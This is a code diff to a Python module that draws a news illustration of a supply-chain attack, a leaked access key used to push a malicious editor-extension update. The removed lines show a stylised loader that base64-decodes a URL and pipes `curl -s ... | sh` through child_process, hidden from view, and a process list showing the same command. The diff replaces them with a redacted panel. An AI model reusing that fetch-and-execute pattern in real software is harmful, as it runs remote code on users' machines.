@@ -9,11 +9,10 @@ only when the headline names them; no logos, generic editor chrome."""
 from __future__ import annotations
 
 import random
-from typing import Sequence
 
 from ..brief import EditorialBrief
 from .. import type as T
-from ..kit import Box, Doc, Run, arrow, background, code, icon, pill, vignette, window
+from ..kit import Box, Doc, arrow, background, icon, pill, vignette, window
 from . import scene
 
 _ATTACK = ("exploited", "confirmed", "attacks_observed", "compromise")
@@ -30,9 +29,10 @@ def _key_card(doc: Doc, b: Box, holder: str, key: str) -> None:
         icon(doc, "key", b.x + 40, b.y + 32, 30, p.ink, 2.2)
         doc.text("ACCESS KEY", b.x + 68, b.y + 39, 17, p.ink, "ui_bold", tracking=1.8)
         doc.text(key, b.x + 26, b.y + 112, 22, p.ink, "mono_bold")
-        doc.text("scope: publish extensions", b.x + 26, b.y + 148, 16, p.muted, "mono")
+        # Only what the sources state: who the key was issued to. Its scope is
+        # not published.
         if holder:
-            doc.text(f"issued to: {holder}", b.x + 26, b.y + 176, 16, p.muted, "mono")
+            doc.text(f"issued to: {holder}", b.x + 26, b.y + 160, 18, p.muted, "mono")
         pill(doc, b.r - 20, b.y + 16, "leaked", fg="#FFFFFF", bg=p.danger, size=14, font="ui_bold", anchor="end")
 
 
@@ -47,8 +47,8 @@ def dev_supply_chain(doc: Doc, brief: EditorialBrief, rng: random.Random) -> Non
     ext = "Claude Code" if "Claude" in ents else "AI Assistant"
     market = next((e for e in ents if e not in (holder, "Claude")), "")
     attack = brief.status in _ATTACK
-    key = "mk_pub_" + "".join(rng.choice("ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789")
-                              for _ in range(6)) + "..."
+    # masked placeholder: the key's real format is not published
+    key = "••••••••" + "".join(rng.choice("ABCDEFGHJKLMNPQRSTUVWXYZ23456789") for _ in range(4))
 
     # ---- 1. the leaked key
     kb = Box(52, 112, 400, 206)
@@ -68,7 +68,6 @@ def dev_supply_chain(doc: Doc, brief: EditorialBrief, rng: random.Random) -> Non
     doc.text("auth:", mb.x + 24, mb.y + 186, 16, p.muted, "mono")
     doc.text(key, mb.x + 84, mb.y + 186, 16, p.ink, "mono")
     icon(doc, "check", mb.r - 40, mb.y + 180, 20, p.safe, 2.6)
-    doc.text("auto-update: on", mb.x + 24, mb.y + 220, 16, p.muted, "mono")
     arrow(doc, [(kb.cx - 40, kb.b + 18), (kb.cx - 40, mb.y - 14)], p.danger, sw=4, head=16)
 
     # ---- 3. the editor that updated (hero)
@@ -95,47 +94,41 @@ def dev_supply_chain(doc: Doc, brief: EditorialBrief, rng: random.Random) -> Non
         doc.text(n, side.x + 74, ry + 20, 17, p.ink, "ui_bold")
         doc.text(sub, side.x + 74, ry + 44, 14, p.danger if hot else p.muted, "mono")
 
-    # editor area: the file the update added
+    # editor area: the update itself. The sources say a malicious version was
+    # published through the marketplace with the leaked key; they do not
+    # describe its code or how it ran, so the contents are shown redacted.
     ed = Box(side.r, body.y, body.r - side.r, body.h)
     doc.rect(ed.x, ed.y, ed.w, 42, "#121A2A")
-    doc.rect(ed.x, ed.y, 220, 42, "#0F1624")
-    doc.rect(ed.x, ed.y, 220, 2, p.danger)
-    doc.text("dist/loader.js", ed.x + 20, ed.y + 27, 15, p.ink, "mono")
-    pill(doc, ed.r - 18, ed.y + 9, "new in this update", fg="#FFFFFF", bg=p.danger, size=12, font="mono",
-         anchor="end")
-    kw, tx, st, cm = "#9CC4FF", "#C9D3E3", "#A5E3B8", "#5F6D86"
-    lines: list[Sequence[Run] | str] = [
-        [("// added by the update", cm)],
-        [("const", kw), (" { exec } = require(", tx), ('"child_process"', st), (");", tx)],
-        [("const", kw), (" u = Buffer.from(", tx), ('"aHR0cHM6Ly9z..."', st), (",", tx)],
-        [('  "base64"', st), (").toString();", tx)],
-        [("exec(", tx), ("`curl -s ${u} | sh`", st), (",", tx)],
-        [("  { windowsHide: ", tx), ("true", kw), (" });", tx)],
-        "",
-        [("module", kw), (".exports = require(", tx), ('"./extension.js"', st), (");", tx)],
-    ]
-    code(doc, ed.x + 64, ed.y + 96, lines, size=18, lh=1.75, width=560,
-         marks={4: p.danger, 5: p.danger} if attack else {})
+    doc.text(f"{ext}: extension details", ed.x + 24, ed.y + 27, 15, p.ink, "ui_bold")
+    x0, y0 = ed.x + 40, ed.y + 96
+    doc.rect(x0, y0, 76, 76, "#24304A", 16)
+    icon(doc, "terminal", x0 + 38, y0 + 38, 40, p.ink, 2.2)
+    doc.text(ext, x0 + 100, y0 + 36, 34, p.ink, "display")
+    doc.text("official listing", x0 + 102, y0 + 66, 16, p.muted, "ui")
+    pill(doc, ed.r - 32, y0 + 14, "new version", fg="#FFFFFF", bg=p.danger, size=14, font="ui_bold", anchor="end")
+    rows2 = [("enabled by", "the stolen access key", p.danger),
+             ("channel", "the official marketplace listing", p.ink),
+             ("status", "malicious version" if attack else "reported", p.danger if attack else p.warn)]
+    for i, (k, v, col) in enumerate(rows2):
+        ry = y0 + 132 + i * 44
+        doc.line((x0, ry - 28), (ed.r - 32, ry - 28), p.line, 1)
+        doc.text(k, x0, ry, 16, p.muted, "mono")
+        doc.text(v, x0 + 190, ry, 17, col, "mono_bold")
+    # contents: redacted on purpose
+    cb = Box(x0, y0 + 278, ed.r - 32 - x0, 270)
+    doc.rect(cb.x, cb.y, cb.w, cb.h, "#0A0F1A", 10, stroke=p.danger, sw=1.6)
+    doc.text("PACKAGE CONTENTS", cb.x + 24, cb.y + 34, 13, p.muted, "ui_bold", tracking=1.6)
+    with doc.g(clip=doc.clip_rect(cb.x + 24, cb.y + 54, cb.w - 48, 136, 6)):
+        doc.rect(cb.x + 24, cb.y + 54, cb.w - 48, 136, "#1A1220")
+        stripes = "".join(f"M{cb.x + 24 + i * 22:.0f} {cb.y + 190:.0f}l136 -136" for i in range(-6, int(cb.w / 22) + 2))
+        doc.path(stripes, stroke=p.danger, sw=7, opacity=0.22)
+    for i, w in enumerate((0.62, 0.48, 0.7, 0.4)):
+        doc.rect(cb.x + 48, cb.y + 76 + i * 28, (cb.w - 96) * w, 12, "#2A1B2C", 4)
+    doc.text("not described in the reports", cb.x + 24, cb.y + 226, 18, p.danger, "mono_bold")
+    doc.text("the sources give no code or execution details", cb.x + 24, cb.y + 252, 14, p.muted, "ui")
     # status bar
     doc.rect(ew.x + 1, ew.b - 34, ew.w - 2, 33, "#1A2540")
-    doc.text(f"{ext} updated automatically", ew.x + 20, ew.b - 12, 14, p.ink, "ui")
-    doc.text("restart not required", ew.r - 20, ew.b - 12, 14, p.muted, "ui", anchor="end")
-
-    # terminal: what the loader started inside the editor's extension host
-    term = Box(ed.x, body.b - 34 - 200, ed.w, 200)
-    doc.rect(term.x, term.y, term.w, term.h, "#0A0F1A")
-    doc.line((term.x, term.y), (term.r, term.y), p.line, 1.2)
-    doc.text("PROCESSES", term.x + 24, term.y + 32, 13, p.ink, "ui_bold", tracking=1.6)
-    doc.text("OUTPUT", term.x + 130, term.y + 32, 13, p.muted, "ui_bold", tracking=1.6)
-    procs = [("extension-host", "node", False), ("language-server", "node", False)]
-    if attack:
-        procs.append(("sh -c curl -s https://... | sh", "child of extension-host", True))
-    for i, (cmd, parent, hot) in enumerate(procs):
-        y = term.y + 70 + i * 38
-        if hot:
-            doc.rect(term.x + 12, y - 24, term.w - 24, 34, p.danger, 4, opacity=0.16)
-        doc.text(cmd, term.x + 24, y, 16, p.danger if hot else p.muted, "mono_bold" if hot else "mono")
-        doc.text(parent, term.r - 24, y, 14, p.danger if hot else p.muted, "mono", anchor="end")
+    doc.text(f"{ext} updated", ew.x + 20, ew.b - 12, 14, p.ink, "ui")
 
     # marketplace -> editor
     arrow(doc, [(mb.r + 12, mb.y + 100), (ew.x - 12, mb.y + 100)], p.danger, sw=4, head=16)
